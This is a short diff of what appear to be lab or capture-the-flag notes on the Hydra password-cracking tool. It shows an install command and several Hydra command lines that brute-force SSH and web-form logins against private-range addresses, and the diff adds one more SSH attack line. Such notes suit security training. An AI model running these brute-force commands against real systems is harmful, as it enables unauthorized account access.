@@ -16,7 +16,7 @@ hydra -l <username> -P <full path to pass> 10.201.20.141 -t 4 ssh
 sudo apt update && sudo apt install -y hydra
 
 hydra -l root -P passwords.txt 10.201.20.141 -t 4 ssh
-
+hydra -l <username> -P <full path to pass> 10.201.106.187 -t 4 ssh
 
 sudo hydra <username> <wordlist> 10.201.20.141 http-post-form "<path>:<login_credentials>:<invalid_response>"
 # ssh brute force
